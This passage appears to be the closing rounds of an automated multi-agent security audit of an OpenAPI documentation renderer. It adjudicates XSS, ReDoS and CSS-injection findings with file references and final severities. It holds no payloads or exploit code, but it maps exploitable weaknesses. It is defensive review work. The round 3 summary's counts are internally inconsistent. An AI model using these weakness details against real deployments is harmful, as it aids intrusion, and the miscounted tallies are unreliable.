Impact on verdict: flip to INVALID (Pattern 6: config-as-vuln; operator supplies a function).

### H-00-J playground ?url= 1-click XSS
Tracer verdict: INVALID (as CRITICAL) / VALID (LOW dev-only)
Advocate position: Confirm INVALID
Defense argument: Tracer's evidence is solid: `build:demo` lacks `--env playground`, `deploy:demo` syncs `demo/dist` to S3, the production demo `demo/index.tsx:125` sets `sanitize:true`. I additionally checked that no GitHub Pages workflow ships `hmr-playground.tsx`. CI does not bundle the playground entry. The file is genuinely dev-only. Pattern 7 (test/example code).
Citations: `demo/webpack.config.ts:22-25`; `package.json` build/deploy scripts; `demo/index.tsx:125`.
Impact on severity: LOW (dev-server only).
Impact on verdict: confirm INVALID as CRITICAL; LOW is informational at best.

### H-01 React style={{backgroundColor}} CSS breakout
Tracer verdict: INVALID
Advocate position: Confirm INVALID
Defense argument: Tracer is correct. React style objects use CSSOM property assignment, which rejects values containing `;` for a single property. No exploit path exists.
Citations: `ApiLogo.tsx:22`; React style-prop semantics.
Impact on severity: N/A.
Impact on verdict: confirm INVALID.

### H-02 schemaRef MDX → second-order XSS
Tracer verdict: VALID (HIGH)
Advocate position: DEFENSIBLE-weak
Defense argument: Requires the spec to use one of three specific MDX tag names (`security-definitions`, `security-definition`, `schema-definition`) — an unusual feature. These MDX tags are a Acme-vendor extension documented in `docs/security-definitions-injection.md`. In practice the vast majority of OpenAPI specs do not embed these vendor MDX tags. Reachability is real (default-on) but practical prevalence is low. Additionally, the same root-cause (sanitize=false) defense from H-00-A applies — if an operator sets sanitize:true, the secondary description goes through DOMPurify on render. Net: real bug but lower-priority than H-00-A.
Citations: `docs/security-definitions-injection.md`; `MarkdownRenderer.ts:209`; `SchemaDefinition.tsx:23-37`.
Impact on severity: downgrade to MEDIUM (real but conditional on MDX usage; mitigated by sanitize:true).
Impact on verdict: leave VALID at MEDIUM.

### H-03 parseProps JSON-prop → component prop injection
Tracer verdict: INVALID
Advocate position: Confirm INVALID
Defense argument: Tracer correctly traced that neither SecurityDefs nor SchemaDefinition spreads unknown props onto a DOM element. propsSelector spread order also overrides attacker props for security-critical fields. Pattern 1: no path to a `dangerouslySetInnerHTML` injection.
Citations: `AdvancedMarkdown.tsx:47`; `SecuritySchemes.tsx:20-43`; `SchemaDefinition.tsx:83-92`.
Impact on severity: N/A.
Impact on verdict: confirm INVALID.

### H-04 logo data: URI tracking + javascript: href chain
Tracer verdict: PARTIAL
Advocate position: DOWN-RANK
Defense argument: SVG-in-img IS sandboxed by all modern browsers (no JS exec). The remaining "tracking" angle is essentially: an attacker who controls the OpenAPI spec can also choose the logo image URL. That is a privacy/branding concern, not an XSS finding. The `javascript:` href portion is already H-00-C. The composite framing adds no new primitive; the data:-src side is non-exploitable for XSS. Drop the "tracking" framing to informational.
Citations: `ApiLogo.tsx:20`; browser SVG-in-img sandbox.
Impact on severity: downgrade to LOW/informational (privacy only).
Impact on verdict: leave VALID at LOW — collapse into H-00-C as a same-element duplicate.

### H-05 heading rule HTML body XSS
Tracer verdict: VALID (MEDIUM, collapsed into H-00-A)
Advocate position: DEFENSIBLE — pattern 8 (double-counting)
Defense argument: Tracer explicitly confirms this collapses into H-00-A. The id-attribute breakout sub-claim is not confirmed (marked slugifies). Net independent contribution: zero. Should be merged into H-00-A's "affected fields" enumeration.
Citations: tracer empirical marked test.
Impact on severity: downgrade to NONE-as-standalone.
Impact on verdict: flip to INVALID-as-independent-finding (Pattern 8). Keep evidence under H-00-A.

### H-06 playground origin amplification
Tracer verdict: INVALID
Advocate position: Confirm INVALID
Defense argument: Contingent on H-00-J being publicly deployed; H-00-J is not deployed publicly. Cascade-INVALID.
Citations: same as H-00-J.
Impact on severity: N/A.
Impact on verdict: confirm INVALID.

### H-07 theme CSS string interpolation
Tracer verdict: VALID (MEDIUM)
Advocate position: DEFENSIBLE
Defense argument: Pure supply-chain dependency: requires either a compromised theme npm package or the operator passing attacker-controlled theme JSON via web-component attribute. The operator controls both surfaces — themes are an operator-trust input documented as such. CSS-exfil only, no JS exec (`javascript:` in CSS `url()` is browser-blocked, confirmed by tracer). Same Pattern 6 (config-as-vuln) issue as H-00-I. styled-components is the industry standard and does not sanitize CSS values either — this is a class issue, not a Acme-specific bug. Best filed as LOW/informational "operator should treat themes as code."
Citations: `helpers.ts:84-109`; tracer styled-components analysis.
Impact on severity: downgrade to LOW.
Impact on verdict: leave VALID at LOW.

---

## Round 3 Advocate Complete

Summary: Of 17 hypotheses, after adversarial defense: 1 finding (H-00-J as CRITICAL) was already INVALID and confirmed; 3 net-new hypotheses (H-01, H-03, H-06) confirmed INVALID; 2 additional findings (H-00-I, H-05) flipped to INVALID/collapsed (config-as-vuln and double-counting respectively); 4 findings downgraded in severity (H-00-A CRITICAL->HIGH as documented opt-in trade-off; H-00-D HIGH->MEDIUM as H-00-A sub-item; H-00-F HIGH->MEDIUM as client-tab DoS only; H-00-G HIGH->LOW as latent-only; H-00-H MEDIUM->LOW as internal-API; H-04 MEDIUM->LOW as privacy only; H-07 MEDIUM->LOW as operator-trust); 2 findings stay at original severity (H-00-C HIGH unchanged — docs do not cover href paths; H-00-E MEDIUM confirmed as client-tab DoS); 1 finding has a conditional verdict (H-00-B: MEDIUM as outdated-dep absent PoC, HIGH if mXSS PoC against the exact call lands); 1 finding (H-02) downgraded HIGH->MEDIUM as MDX-conditional. Net surviving as VALID: ~10 findings (H-00-A HIGH, H-00-B MEDIUM-or-HIGH, H-00-C HIGH, H-00-D MEDIUM-as-subitem, H-00-E MEDIUM, H-00-F MEDIUM, H-00-G LOW, H-00-H LOW, H-02 MEDIUM, H-04 LOW, H-07 LOW); 2 flipped to INVALID (H-00-I, H-05); 4 previously INVALID confirmed (H-00-J-as-CRITICAL, H-01, H-03, H-06).

---

## Round 4 -- Chamber Close

Synthesizer: archon-audit-review-adjudicator (chamber-synth-01) | Timestamp: 2026-05-19T00:00:00Z

### Final Verdicts

| H-ID | Title | Verdict | Severity (final) | Draft File |
|------|-------|---------|------------------|-----------|
| H-00-A | sanitize=false default → raw-HTML XSS via spec Markdown fields | VALID | HIGH (adj. from CRITICAL — documented opt-in) | archon/findings-draft/p5-003-sanitize-default-off-xss.md (primary) + archon/findings-draft/p6-002-sanitize-false-default-fail-open.md (duplicate, downstream merge) |
| H-00-B | DOMPurify 3.2.4 unpatched mXSS reachable when sanitize=true | VALID | HIGH conditional on PoC, MEDIUM without | archon/findings-draft/p5-002-dompurify-outdated-mxss.md |
| H-00-C | 8 spec-derived `<a href={x}>` sites without scheme allow-list | VALID | HIGH | archon/findings-draft/p5-001-spec-href-javascript-scheme-xss.md (primary) + archon/findings-draft/p6-001-oauth-url-javascript-injection.md (duplicate, downstream merge) |
| H-00-D | OAuth scope + security-scheme description Markdown XSS (sub of H-00-A) | VALID | MEDIUM | archon/findings-draft/p10-004-oauth-scope-description-xss-default-sanitize-false.md |
| H-00-E | parseProps polynomial ReDoS in default-on Markdown pipeline | VALID | MEDIUM | archon/findings-draft/p5-004-parseprops-redos.md |
| H-00-F | COMPONENT_REGEXP cross-line ReDoS, default-on | VALID | MEDIUM (adj. from HIGH — single-tab client DoS) | archon/findings-draft/p10-005-component-regexp-cross-line-redos.md |
| H-00-G | SourceCode + JsonViewer dangerouslySetInnerHTML outside DOMPurify scope (latent) | VALID | LOW (adj. from HIGH — no current exploit input) | archon/findings-draft/p5-006-sourcecode-prism-unguarded-sink.md |
| H-00-H | Markdown.tsx sanitize prop dead — silent API contract violation | VALID | LOW (adj. from MEDIUM — internal-only component) | archon/findings-draft/p10-006-markdown-component-sanitize-prop-dead.md |
| H-00-I | theme.extensionsHook CSS injection | INVALID | — | (no draft; Pattern 6 config-as-vuln, operator supplies fn) |
| H-00-J | playground ?url= 1-click XSS | INVALID as CRITICAL / LOW dev-only | LOW informational | (no p10 draft; Tracer evidence in debate.md) |
| H-01 | spec style={{backgroundColor}} CSS breakout | INVALID | — | (no draft; React CSSOM sandboxes value) |
| H-02 | <schema-definition schemaRef> second-order XSS | VALID | MEDIUM (adj. from HIGH — vendor MDX prevalence low) | archon/findings-draft/p10-001-schemaref-mdx-second-order-xss.md |
| H-03 | parseProps JSON-prop → component prop injection | INVALID | — | (no draft; SecurityDefs/SchemaDefinition do not spread unknown props to DOM elements; propsSelector overrides attacker keys) |
| H-04 | data: URI tracking + javascript: href on logo (composite) | VALID | LOW (adj. from MEDIUM — XSS portion = H-00-C, remainder is privacy/branding) | archon/findings-draft/p10-002-logo-href-data-uri-tracking.md |
| H-05 | headingRule body XSS / id-attribute breakout | INVALID as standalone | — | (Pattern 8: collapsed into H-00-A; id-attr breakout sub-claim not confirmed — marked slugifies) |
| H-06 | playground origin amplification | INVALID | — | (cascade-INVALID with H-00-J; precondition false) |
| H-07 | theme CSS string-value styled-components interpolation | VALID | LOW (adj. from MEDIUM — operator-trust supply chain, CSS-exfil only) | archon/findings-draft/p10-003-theme-css-injection-styled-components.md |

### Summary

- VALID findings: 11 (H-00-A, H-00-B, H-00-C, H-00-D, H-00-E, H-00-F, H-00-G, H-00-H, H-02, H-04, H-07)
- INVALID / dropped: 6 (H-00-I, H-00-J-as-CRITICAL, H-01, H-03, H-05-as-standalone, H-06)
- Draft files produced/updated: 13 (5 p5-, 2 p6-duplicates, 6 p10-) — p6-001 / p6-002 flagged for downstream dedup against p5-001 / p5-003 respectively
- Attack patterns registered: 6 (PATT-001..PATT-005 from Tracer + PATT-006 documented-insecure-default added by Advocate)
- Severity adjustments: H-00-A CRITICAL→HIGH, H-00-F HIGH→MEDIUM, H-00-G HIGH→LOW, H-00-H MEDIUM→LOW, H-02 HIGH→MEDIUM, H-04 MEDIUM→LOW, H-07 MEDIUM→LOW

Status: CLOSED
Chamber closed: 2026-05-19T00:00:00Z
